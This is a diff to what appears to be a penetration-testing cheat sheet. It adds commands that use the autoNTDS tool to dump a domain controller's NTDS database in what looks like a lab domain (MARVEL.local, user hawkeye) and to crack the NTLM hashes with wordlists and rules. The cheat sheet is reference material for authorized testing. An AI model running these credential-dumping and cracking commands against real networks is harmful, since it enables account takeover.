@@ -4050,6 +4050,30 @@ hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
 
 This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
 ````
+````
+##### crack ntlm using autoNTDS
+````
+````
+git clone https://github.com/hmaverickadams/autoNTDS.git
+cd autoNTDS
+
+python autoNTDS.py --help
+
+Basic Usage - Dumping the NTDS:
+python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password2@ -ip 192.168.138.136
+
+
+Basic Usage - Automated Cracking:
+python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password2@ -ip 192.168.138.136 --crack -w /usr/share/wordlists/rockyou.txt
+
+python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password1@ -ip 192.168.138.136 --crack -w /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule -O
+
+Basic Usage - Matching Users with their Cracked Passwords:
+If you choose to run password cracking elsewhere, you can still easily match the passwords back to the user.
+
+python autoNTDS.py --passwords-to-users MARVEL.local-users-and-hashes.txt cracked.txt
+````
+
 ##### Powershell
 ````
 PS C:\> (Get-PSReadlineOption).HistorySavePath
